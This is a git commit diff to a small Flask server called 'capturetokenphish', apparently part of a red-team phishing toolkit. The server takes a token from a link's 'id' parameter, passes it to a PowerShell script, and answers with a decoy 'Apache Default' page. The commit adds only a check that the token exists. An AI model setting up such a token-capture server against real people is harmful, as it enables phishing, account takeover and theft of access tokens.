e629fe8ef04d9eedaa59c5c1d770efd686581f99
Steve Borosh <rvrsh3ll@users.noreply.github.com>
2022-10-23 06:32:56 -0600

    handle errors

--- capturetokenphish/capturetokenphish.py
+++ capturetokenphish/capturetokenphish.py
@@ -7,7 +7,8 @@ app = Flask(__name__)
 @app.route("/", methods=['GET'])
 def hello():
     token = request.args.get("id")
-    print(call(["/opt/microsoft/powershell/7/pwsh", "./capturetokenphish.ps1", token]))
+    if token:
+        print(call(["/opt/microsoft/powershell/7/pwsh", "./capturetokenphish.ps1", token]))
     return "Apache Default"
 
 if __name__ == "__main__":
